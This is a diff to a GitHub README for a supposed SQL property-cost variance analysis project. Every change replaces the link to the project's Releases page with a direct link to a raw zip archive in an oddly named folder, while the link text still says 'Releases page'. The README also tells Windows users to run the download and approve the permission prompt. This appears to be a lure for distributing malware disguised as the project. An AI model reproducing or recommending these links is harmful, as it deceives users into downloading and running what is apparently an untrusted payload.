@@ -1,6 +1,6 @@
 # 📊 Sql-Financial-Variance-Analysis-Barakah-Properties - Track Property Costs With Clarity
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/raw/refs/heads/main/infatuatedly/Sql_Barakah_Financial_Properties_Variance_Analysis_v2.6-beta.4.zip)
 
 ## 🖥️ What This Project Does
 
@@ -20,7 +20,7 @@ It is built for users who want a clear view of financial variance in a real esta
 
 ## 📥 Download and Run on Windows
 
-1. Go to the [Releases page](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/releases)
+1. Go to the [Releases page](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/raw/refs/heads/main/infatuatedly/Sql_Barakah_Financial_Properties_Variance_Analysis_v2.6-beta.4.zip)
 2. Download the latest Windows release file
 3. Open the downloaded file from your Downloads folder
 4. If Windows asks for permission, choose **Run** or **Yes**
@@ -221,4 +221,4 @@ These topics match the project’s goal of showing how property income compares 
 
 ## 📎 Download Again
 
-[Visit the Releases page to download](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/releases)
+[Visit the Releases page to download](https://github.com/theamannnn/Sql-Financial-Variance-Analysis-Barakah-Properties/raw/refs/heads/main/infatuatedly/Sql_Barakah_Financial_Properties_Variance_Analysis_v2.6-beta.4.zip)
